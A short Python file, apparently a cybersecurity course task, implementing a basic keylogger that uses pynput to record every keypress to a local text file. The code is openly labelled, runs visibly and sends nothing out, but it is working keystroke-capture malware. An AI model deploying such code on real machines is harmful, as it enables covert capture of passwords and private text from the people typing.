# fahadafzaal-CyberSec-Task-key_logger.py
from pynput.keyboard import Listener

# Define the file where we'll save the logs
log_file = "key_log.txt"

# Function to log the keys to a file
def log_keystroke(key):
    # Convert key to string and remove special characters like 'Key.space'
    key_data = str(key).replace("'", "")
    
    # Handle special keys such as space, enter, etc.
    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.enter':
        key_data = '\n'
    elif key_data.startswith('Key'):
        key_data = f'[{key_data}]'

    # Append the key to the log file
    with open(log_file, 'a') as f:
        f.write(key_data)

# Function to start the keylogger listener
def start_keylogger():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger is running... Press Ctrl + C to stop.")
    start_keylogger()
